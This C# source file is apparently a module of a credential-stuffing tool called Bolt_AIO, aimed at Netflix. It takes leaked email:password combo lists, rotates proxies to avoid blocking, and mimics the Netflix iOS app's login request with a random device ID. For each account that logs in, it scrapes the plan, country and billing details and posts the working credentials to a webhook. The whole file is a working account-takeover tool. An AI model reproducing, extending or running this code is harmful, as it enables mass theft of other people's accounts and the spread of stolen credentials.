using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using BoltCUI;
using Leaf.xNet;
using HttpRequest = Leaf.xNet.HttpRequest;

namespace Bolt_AIO
{
    internal class Netflixmod
    {
        private static readonly Random random = new Random();

        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            var random = "NFAPPL-02-IPHONE7=2-" + RandomCapitalsAndDigits(64);
                            var KIR = UrlEncode("NFAPPL-02-IPHONE7=2-" + random);
                            var paramsData = UrlEncode("{\"action\":\"loginAction\",\"fields\":{\"userLoginId\":\"" +
                                                       array[0] + "\",\"rememberMe\":\"true\",\"password\":\"" +
                                                       array[1] +
                                                       "\"},\"verb\":\"POST\",\"mode\":\"login\",\"flow\":\"appleSignUp\"}");
                            var length =
                                "appInternalVersion=11.44.0&appVersion=11.44.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22clipsEnabled%22%3A%22false%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22seasonRenewalPostPlayEnabled%22%3A%22true%22%2C%22previewsBrandingEnabled%22%3A%22true%22%2C%22aroGalleriesEnabled%22%3A%22true%22%2C%22interactiveFeatureSugarPuffsEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22searchImageLocalizationFallbackLocales%22%3Atrue%2C%22billboardEnabled%22%3A%22true%22%2C%22searchImageLocalizationOnResultsOnly%22%3A%22false%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22characterBarOnPhoneEnabled%22%3A%22false%22%2C%22contentWarningEnabled%22%3A%22true%22%2C%22bigRowEnabled%22%3A%22true%22%2C%22interactiveFeatureAppUpdateDialogueEnabled%22%3A%22false%22%2C%22familiarityUIEnabled%22%3A%22false%22%2C%22bigrowNewUIEnabled%22%3A%22false%22%2C%22interactiveFeatureSugarPuffsPreplayEnabled%22%3A%22true%22%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22motionCharacterEnabled%22%3A%22true%22%2C%22roarEnabled%22%3A%22true%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22mobileCollectionsEnabled%22%3A%22false%22%2C%22interactiveFeatureMinecraftEnabled%22%3A%22true%22%2C%22searchImageLocalizationEnabled%22%3A%22false%22%2C%22interactiveFeatureKimmyEnabled%22%3A%22true%22%2C%22interactiveFeatureYouVsWildEnabled%22%3A%22true%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22kidsTrailers%22%3Atrue%7D&device_type=NFAPPL-02-&esn=" +
                                KIR +
                                "&idiom=phone&iosVersion=12.4.3&isTablet=false&kids=false&maxDeviceWidth=375&method=call&model=saget&modelType=IPHONE7-2&odpAware=true&param=" +
                                paramsData + "&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json"
                                    .Length;

                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Argo/11.44.0 (iPhone; iOS 12.4.3; Scale/2.00)";
                            req.AddHeader("Host", "ios.prod.ftl.netflix.com");
                            req.AddHeader("X-Netflix.Argo.abTests", "");
                            req.AddHeader("X-Netflix.client.appVersion", "11.44.0");
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("X-Netflix.Argo.NFNSM", "9");
                            req.AddHeader("Accept-Language", "en-US;q=1, fa-UK;q=0.9, en-UK;q=0.8, ar-UK;q=0.7");
                            req.AddHeader("Accept-Encoding", "gzip, deflate");
                            req.AddHeader("X-Netflix.Request.Attempt", "1");
                            req.AddHeader("X-Netflix.client.idiom", "phone");
                            req.AddHeader("X-Netflix.Request.Routing",
                                "{\"path\":\"/nq/iosui/argo/~11.44.0/user\",\"control_tag\":\"iosui_argo_non_member\"}");
                            req.AddHeader("X-Netflix.client.type", "argo");
                            req.AddHeader("Content-Length", length);
                            req.AddHeader("Connection", "close");
                            req.AddHeader("X-Netflix.client.iosVersion", "12.4.3");

                            var post = req.Post("https://ios.prod.ftl.netflix.com/iosui/user/11.44",
                                "appInternalVersion=11.44.0&appVersion=11.44.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22clipsEnabled%22%3A%22false%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22seasonRenewalPostPlayEnabled%22%3A%22true%22%2C%22previewsBrandingEnabled%22%3A%22true%22%2C%22aroGalleriesEnabled%22%3A%22true%22%2C%22interactiveFeatureSugarPuffsEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22searchImageLocalizationFallbackLocales%22%3Atrue%2C%22billboardEnabled%22%3A%22true%22%2C%22searchImageLocalizationOnResultsOnly%22%3A%22false%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22characterBarOnPhoneEnabled%22%3A%22false%22%2C%22contentWarningEnabled%22%3A%22true%22%2C%22bigRowEnabled%22%3A%22true%22%2C%22interactiveFeatureAppUpdateDialogueEnabled%22%3A%22false%22%2C%22familiarityUIEnabled%22%3A%22false%22%2C%22bigrowNewUIEnabled%22%3A%22false%22%2C%22interactiveFeatureSugarPuffsPreplayEnabled%22%3A%22true%22%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22motionCharacterEnabled%22%3A%22true%22%2C%22roarEnabled%22%3A%22true%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22mobileCollectionsEnabled%22%3A%22false%22%2C%22interactiveFeatureMinecraftEnabled%22%3A%22true%22%2C%22searchImageLocalizationEnabled%22%3A%22false%22%2C%22interactiveFeatureKimmyEnabled%22%3A%22true%22%2C%22interactiveFeatureYouVsWildEnabled%22%3A%22true%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22kidsTrailers%22%3Atrue%7D&device_type=NFAPPL-02-&esn=" +
                                KIR +
                                "&idiom=phone&iosVersion=12.4.3&isTablet=false&kids=false&maxDeviceWidth=375&method=call&model=saget&modelType=IPHONE7-2&odpAware=true&param=" +
                                paramsData + "&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json",
                                "application/x-www-form-urlencoded").ToString();

                            if (!post.Contains("\"value\":\"incorrect_password\"},") ||
                                !post.Contains("unrecognized_email_consumption_only") ||
                                !post.Contains("login_error_consumption_only"))
                            {
                                if (post.Contains("memberHome"))
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    var cookie = Parse(post, "\"flwssn\":\"", "\"");
                                    var cookiess = new CookieStorage();

                                    req.AddHeader("Cookie", "flwssn: " + cookie);
                                    req.Cookies = cookiess;
                                    req.AddHeader("Accept",
                                        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                                    req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                                    req.AddHeader("Cache-Control", "max-age=0");
                                    req.AddHeader("Connection", "keep-alive");
                                    req.Referer = "https://www.netflix.com/browse";
                                    req.AddHeader("Sec-Fetch-Dest", "document");
                                    req.AddHeader("Sec-Fetch-Mode", "navigate");
                                    req.AddHeader("Sec-Fetch-Site", "same-origin");
                                    req.AddHeader("Sec-Fetch-User", "?1");
                                    req.AddHeader("Upgrade-Insecure-Requests", "1");
                                    req.UserAgent =
                                        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1";
                                    var strResponse = req.Get(new Uri("https://www.netflix.com/YourAccount"))
                                        .ToString();

                                    if (strResponse.Contains("currentPlanName\""))
                                    {
                                        var Sub = Parse(strResponse, "\"currentPlanName\":\"", "\"");
                                        var plan = Parse(strResponse, ",\"planDuration\":\"", "\",\"localizedPlanName");
                                        var trial = Parse(strResponse, "\"isInFreeTrial\":", ",");
                                        var Country = Parse(strResponse, "\",\"currentCountry\":\"", "\"");

                                        var capture =
                                            $"Suubscription: {Sub} - Plan: {plan} - Trial: {trial} - Country: {Country}";
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("NETFLIX", array[0] + ":" + array[1] + capture);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1],
                                                "NETFLIX");
                                    }
                                }
                                else if (post.Contains("never_member_consumption_only"))
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    if (Program.lorc == "LOG") Settings.PrintFree("NETFLIX", array[0] + ":" + array[1]);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1],
                                            "NETFLIX Frees");
                                }
                                else if (post.Contains("former_member_consumption_only"))
                                {
                                    Program.Others++;
                                    Program.TotalChecks++;
                                }
                            }
                            else
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string NetflixGetCaptures(string cookie, CookieStorage cookies)
        {
            for (var i = 0; i < 5; i++)
                while (true)
                    try
                    {
                        using (var req = new HttpRequest())
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.AddHeader("Cookie", "flwssn: " + cookie);
                            req.Cookies = cookies;
                            req.AddHeader("Accept",
                                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                            req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                            req.AddHeader("Cache-Control", "max-age=0");
                            req.AddHeader("Connection", "keep-alive");
                            req.Referer = "https://www.netflix.com/browse";
                            req.AddHeader("Sec-Fetch-Dest", "document");
                            req.AddHeader("Sec-Fetch-Mode", "navigate");
                            req.AddHeader("Sec-Fetch-Site", "same-origin");
                            req.AddHeader("Sec-Fetch-User", "?1");
                            req.AddHeader("Upgrade-Insecure-Requests", "1");
                            req.UserAgent =
                                "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1";
                            var strResponse = req.Get(new Uri("https://www.netflix.com/YourAccount")).ToString();

                            if (strResponse.Contains("currentPlanName\""))
                            {
                                var plan = Regex.Match(strResponse, "\"currentPlanName\":\"(.*?)\"").Groups[1].Value
                                    .Replace("\\u03A4\\u03C5\\u03C0\\u03B9\\u03BA\\u03CC", "Basic")
                                    .Replace("B\\u00E1sico", "Basic").Replace("u57FAu672C", "Basic")
                                    .Replace("Est\\u00E1ndar", "Standard").Replace("Standart", "Standard");
                                var country = Regex.Match(strResponse, "\"currentCountry\":\"(.*?)\"").Groups[1].Value;
                                var isDVD = Regex.Match(strResponse, "\"isDVD\":(.*?),").Groups[1].Value;
                                var screens = Regex.Match(strResponse, "\"maxStreams\":([0-9]*?),").Groups[1].Value;
                                var nextBillingDate = Regex.Match(strResponse, "\"nextBillingDate\":\"(.*?)\"")
                                    .Groups[1].Value.Replace("\\x2F", "/").Replace("\\x20", "/");

                                return
                                    $"Plan: {plan} - Screens: {screens} - Country: {country} - DVD: {isDVD} - Next Billing: {nextBillingDate}";
                            }
                        }
                    }
                    catch
                    {
                        Program.Errors++;
                    }

            return "Working - Failed Capture";
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string UrlEncode(string s)
        {
            return HttpUtility.UrlEncode(s);
        }

        public static string RandomCapitalsAndDigits(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}